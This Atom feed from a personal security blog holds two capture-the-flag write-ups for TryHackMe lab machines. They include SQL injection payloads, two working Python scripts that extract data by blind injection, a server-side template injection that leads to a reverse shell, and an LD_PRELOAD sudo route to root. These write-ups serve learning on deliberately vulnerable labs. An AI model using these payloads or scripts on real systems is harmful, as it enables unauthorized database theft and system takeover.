<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="https://darrynbrownfield.co.uk/tag/medium/feed.xml" rel="self" type="application/atom+xml" />
  <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
  <updated>2021-05-31T15:36:42+00:00</updated>
  <id>https://darrynbrownfield.co.uk/tag/medium/feed.xml</id>

  
  
  

  
    <title type="html">Darryn Brownfield | </title>
  

  
    <subtitle>Infosec | Hacking | CTF</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">SQHell Write Up</title>
      <link href="https://darrynbrownfield.co.uk/sqhell" rel="alternate" type="text/html" title="SQHell Write Up" />
      <published>2021-05-31T00:00:00+00:00</published>
      <updated>2021-05-31T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/sqhell</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/sqhell">&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/cover.jpeg&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/sqhell&quot;&gt;sqhell&lt;/a&gt; is a fun medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/adamtlangley&quot;&gt;Adam Langley&lt;/a&gt;. I found this room incredibly frustrating but also very rewarding and really helped me understand some key SQLI techniques.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I have wrote this write up over a couple of days, so I’ve added a entry in my etc hosts file of ‘sqhell.thm’ to provide consistency across the screen shots as the IP will change.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.24.70
# Nmap 7.80 scan initiated Sun May 30 17:55:54 2021 as: nmap -sC -sV -oA nmap/initial 10.10.24.70
Nmap scan report for 10.10.24.70
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 30 17:56:03 2021 -- 1 IP address (1 host up) scanned in 8.36 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - OpenSSH 8.2p1&lt;/li&gt;
  &lt;li&gt;80 - HTTP - nginx 1.18.0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;flag-1&quot;&gt;Flag 1&lt;/h3&gt;

&lt;p&gt;Based on the room name I know this is going to consist of SQLI challenges so I went straight to the web page and found a blog.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first thing I looked at was the login page, and tried the usual bypass technique: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' or 1=1;-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag1.png&quot; alt=&quot;flag1&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-2&quot;&gt;Flag 2&lt;/h3&gt;

&lt;p&gt;Flag 2 was the first of the two difficult flags, Looking at the room hints:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Make sure to read the terms and conditions ;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/TCs.png&quot; alt=&quot;TCs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A common way of monitoring a client IP is adding a header to the web request such as ‘X-Forwarded-For: &lt;client ip=&quot;&quot;&gt;', I've seen this a lot on load balancers and WAF's to provide persistance and send all requests from a single source to the same webserver. Below are some example headers:&lt;/client&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;X-Forwarded-For:&lt;/li&gt;
  &lt;li&gt;X-Originating-IP:&lt;/li&gt;
  &lt;li&gt;X-Remote-IP:&lt;/li&gt;
  &lt;li&gt;X-Remote-Addr:&lt;/li&gt;
  &lt;li&gt;X-Forwarded-Host:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I can use time based SQL injection and use sleep, if the header is vulnerable the page will sleep (wait) before returning the page.&lt;/p&gt;

&lt;p&gt;I opened Burp and added the X-Forwarded-For header, I tried lots of payloads with no success until I found a great &lt;a href=&quot;https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b&quot;&gt;resource&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Finally the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '1'='1&lt;/code&gt; worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/timebased.gif&quot; alt=&quot;timebased&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now I know the X-Forwarded-For header is vulnerable I need to find a way to retrieve data. The flag format is ‘THM{FLAG……’ and stored in the flag column in the flag table so I can use substring to check for each character and if its a match then sleep.&lt;/p&gt;

&lt;p&gt;Using &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/sql-injection&quot;&gt;hacktricks&lt;/a&gt; I created the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;1' AND (SELECT sleep(5) FROM flag where SUBSTR(flag,1,1) = 'T') and '1'='1&lt;/code&gt;. I tested a few characters and incremented the offset and it confirmed this was flag 2. I created the below python script to automate the process.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# Script to retrieve flag 2 for room SQHell - https://tryhackme.com/room/sqhell

import requests
import time
import string

url = &quot;&quot; #Room IP

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

flag = &quot;&quot;
counter = 1

payload = f&quot;1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '2') and '1'='1&quot;

headers = {'X-Forwarded-For':payload}

while True:
    for i in characterlist:
        payload = f&quot;1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '{i}') and '1'='1&quot;
        headers = {'X-Forwarded-For':payload}
        start = time.time()
        r = requests.get(url, headers = headers)
        end = time.time()
        if end-start &amp;gt;= 2:
            flag += i
            counter += 1
            break
    print(flag)
    if len(flag) &amp;gt;= 43:
        exit(f&quot;The Flag is: {flag}&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the script will retrieve the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag2.png&quot; alt=&quot;flag2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-3&quot;&gt;Flag 3&lt;/h3&gt;
&lt;p&gt;Looking at the register page of the blog, its possible to check if a username already exists.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/username.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is done by a script in the page source code.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;script&amp;gt;
    $('input[name=&quot;username&quot;]').keyup(function(){
        $('.userstatus').html('');
        let username = $(this).val();
        $.getJSON('/register/user-check?username='+ username,function(resp){
            if( resp.available ){
                $('.userstatus').css('color','#80c13d');
                $('.userstatus').html('Username available');
            }else{
                $('.userstatus').css('color','#F00');
                $('.userstatus').html('Username already taken');
            }
        });
    });
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It’s possible to navigate directly to this endpoint to check the result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/usernameavailable.gif&quot; alt=&quot;checkusername&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use this to provide logic to determine if a condition is true or false. Using the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' and 1=2;-- -&lt;/code&gt; which of course is not true as 1 doesnt equal 1 returns an available = true statement.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/false.png&quot; alt=&quot;false&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' and 1=1;-- -&lt;/code&gt; which is true returns available = false&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/true.png&quot; alt=&quot;true&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using substring again allows for each character to be checked. If the character is a match, an available equals false will be returned. To confirm I used the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),1,1)) = 'T';-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This worked and returned a false statement. I created a script to automate the process.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;import requests
import string

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

ip = &quot;&quot; #change to machine IP

flag = &quot;&quot;

counter = 1

while True:
    for i in characterlist: # loop through each character in the character list
        r = requests.get(&quot;http://&quot; +  ip + f&quot;/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{i}';-- -&quot;) #create request
        if 'false' in r.text: # check if return 'false' statement which indicates a match
            flag += i # add the character to the flag string
            counter += 1 # increment the counter by one to then check the next letter
            print(flag) 
            break
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the script provided the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag3.png&quot; alt=&quot;flag3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-4&quot;&gt;Flag 4&lt;/h3&gt;
&lt;p&gt;Flag 4 was the second of the two difficult flags, it has the following hint:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Well, dreams, they feel real while we’re in them right?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Googling this provides references to the film Inception. Looking at a user on the blog, showed details of the user along with the posts they had submitted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/user.png&quot; alt=&quot;user&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried a union select payload and repeated adding null entires until I was able to determine the number of columns which was 3.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/user?id=1 union select null,null,null;-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/select.png&quot; alt=&quot;select&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I now spent a long time enumerating the database to find the flag but with no luck. While completing the enumeration I was able to determine there was only one user. Any other number resulted in user not found being returned.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/select.png&quot; alt=&quot;user2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, even with an invalid user id, if I changed the first null value to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; I could return a list of the users posts. Which would indicate another SQL query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/id1.png&quot; alt=&quot;id1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So to test this I created another union select statement in the user id colum using the same technique as before by repeatedly adding null columns. Once I got to 4 columns the two posts were returned with a blank bullet point.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/inception.png&quot; alt=&quot;inception&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now it was just a case of finding a column which I could use to populate the flag which was column two and select the flag from the flag table. The final payload was: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/user?id=2 union select &quot;1 union select null,flag,null,null from flag&quot;,null,null from information_schema.tables where table_schema=database();-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag4.png&quot; alt=&quot;flag4&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-5&quot;&gt;Flag 5&lt;/h3&gt;
&lt;p&gt;Flag 5 is obtained by using union based injection Looking at the post page url, the posts are retrieved by id: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/post?id=2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/postid.png&quot; alt=&quot;postid&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This looks injectable, to confirm I simply added a &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; after the id number.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/iderror.png&quot; alt=&quot;iderror&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This resulted in an error indicating an SQLI could be possible. For a union select injection attack to work the number of returned columns need to match the original query. I used order by to determine the number of columns.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/idorder.gif&quot; alt=&quot;idorder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got an error on order by 5 indicating there are 4 columns.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/idtesting.png&quot; alt=&quot;idtesting&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was then able to simple retrieve the flag using the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/post?id=2 and 1=2 union select null,null,flag,null from flag&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag5.png&quot; alt=&quot;flag5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/&lt;/li&gt;
  &lt;li&gt;https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b&lt;/li&gt;
  &lt;li&gt;https://book.hacktricks.xyz/pentesting-web/sql-injection&lt;/li&gt;
&lt;/ul&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Keldagrim Write Up</title>
      <link href="https://darrynbrownfield.co.uk/keldagrim" rel="alternate" type="text/html" title="Keldagrim Write Up" />
      <published>2021-03-06T00:00:00+00:00</published>
      <updated>2021-03-06T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/keldagrim</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/keldagrim">&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cover.png&quot; alt=&quot;keldagrim&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/keldagrim&quot;&gt;Keldagrim&lt;/a&gt; is a medium level CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/optionalctf&quot;&gt;Optional&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Can you overcome the forge and steal all of the gold!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.252.142 I started a nmap scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.252.142
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-06 13:03 GMT
Nmap scan report for 10.10.252.142
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
|_  256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title:  Home page 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Werkzeug httpd 1.0.1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I opened up my browser and started to have a look at the web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing really stood out however when I looked at the source code I could see a disabled link to /admin&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;    &amp;lt;li class=&quot;nav-item dropdown&quot;&amp;gt;
        &amp;lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;navbarDropdown&quot; role=&quot;button&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&amp;gt;
          Buy Gold
        &amp;lt;/a&amp;gt;
        &amp;lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;navbarDropdown&quot;&amp;gt;
            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/wow&quot;&amp;gt;World of Warcraft&amp;lt;/a&amp;gt;
            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/OSRunescape&quot;&amp;gt;Old School Runescape&amp;lt;/a&amp;gt;
            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/runescape&quot;&amp;gt;Runescape3&amp;lt;/a&amp;gt;
          &amp;lt;div class=&quot;dropdown-divider&quot;&amp;gt;&amp;lt;/div&amp;gt;
          &amp;lt;a class=&quot;dropdown-item &quot; href=&quot;/admin&quot;&amp;gt;Admin&amp;lt;/a&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However the page looks pretty much the same. So I looked at cookies and found a session cooke with a base64 value.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/guest.png&quot; alt=&quot;guest&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are lots of ways to change the base64 to plaintext but I really like &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; at the moment. Using CyberChef I was able to see the value was ‘guest’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cyberchef.png&quot; alt=&quot;cyberchef&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used CyberChef again to encode ‘admin’ in to base64.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/adminhash.png&quot; alt=&quot;adminhash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Simply changing the session cookie value to the base64 output and refreshing the page now allowed me to see - ‘Current user - $2,165’ and be provided with a sales cookie.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sales.png&quot; alt=&quot;sales&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was also base64 encoded, CyberChef has a great feature called ‘Magic’, if you are unsure how something is encoded use magic to suggest and test various operations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/saleshash.png&quot; alt=&quot;saleshash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This next bit took some time, I was able to base64 a string and input it in to the sales cookie and it would be displayed on the webpage, however I was unsure how I would be able to use this to get a foothold on the box. After some googling, I tried a technique called Server Side Template Injection (SSTI). This was not something I had tried to exploit before so I did some research on the technique to try and understand it and used &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; to see if I was on the right track.&lt;/p&gt;

&lt;p&gt;I found a payload {{7*'7’}} and if I had SSTI that should result in 7777777. I encoded the payload in base64 and updated the sales cookie with the output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sstipayload.png&quot; alt=&quot;sstipayload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Refreshed the page and confirmed I had SSTI in the sales cookie!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/ssti.png&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;On the same &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; page was an example for remote code execution. I took the example for exploiting an SSTI by calling Popen without guessing the offset, changed the IP and port values and encoded again with base64.&lt;/p&gt;

&lt;p&gt;I opened a nc listener and updated the sales cookie with the base64 output and got a shell!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.252.142] 36928
/bin/sh: 0: can't access tty; job control turned off
$ whoami
jed
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Now to get root i checked ‘sudo -l’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I had a look at &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; for ‘/bin/ps’ but as expected I didn’t find anything, I also noticed ‘env_keep+=LD_PRELOAD’. There is a great course by &lt;a href=&quot;https://twitter.com/thecybermentor&quot;&gt;Heath Adams&lt;/a&gt; on &lt;a href=&quot;https://www.udemy.com/course/linux-privilege-escalation-for-beginners&quot;&gt;udemy&lt;/a&gt; for Linux privesc techinques and this is covered as part of the course. There is also a great &lt;a href=&quot;https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/&quot;&gt;article&lt;/a&gt; which covers it.&lt;/p&gt;

&lt;p&gt;I used the steps in the article to create a file called evil.c, compiled with GCC. Ran the sudo command with LD_PRELOAD and got root!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;jed@keldagrim:/dev/shm$ sudo LD_PRELOAD=/dev/shm/evil.so ps
root@keldagrim:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@keldagrim:/dev/shm# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
</feed>
